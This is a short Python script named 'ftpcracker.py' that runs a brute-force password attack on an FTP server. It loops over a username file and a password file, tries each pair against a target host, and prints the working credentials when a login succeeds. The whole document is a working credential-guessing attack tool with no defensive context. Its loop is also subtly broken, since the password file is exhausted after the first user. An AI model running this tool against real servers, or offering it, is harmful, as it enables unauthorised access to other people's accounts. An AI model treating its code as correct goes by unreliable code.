#!/usr/bin/python3
import ftplib
import sys
from colorama import Fore, Style

def logfile(target, users, passw):
	try:
		ufile = open(users,'r')
		pfile = open(passw,'r')
		for user in ufile.readlines():
		    for password in pfile.readlines():
		                bruteftp(target, user, password)
	except Exception as e:
		print(e)

def bruteftp(target, users, passw):
	try:
		ftp = ftplib.FTP(target)
		user = users.strip('\r').strip('\n')
		password = passw.strip('\r').strip('\n')
		print('[-] Trying with: '+user+ ":" +password)
		ftp.login(user,password)
		ftp.quit()
		print(Fore.GREEN + '[+] Login Succeeded with: '+user+":"+password)
		quit()

	except Exception as e:
		print("Incorrect credentials")
		return(None, None)

if len(sys.argv) != 4:
	print("Not enough arguments:\n" + 'Usage: ftpcracker.py target userfile passfile')
else:
	host = sys.argv[1]
	users = sys.argv[2]
	passw = sys.argv[3]
	logfile(host,users,passw)


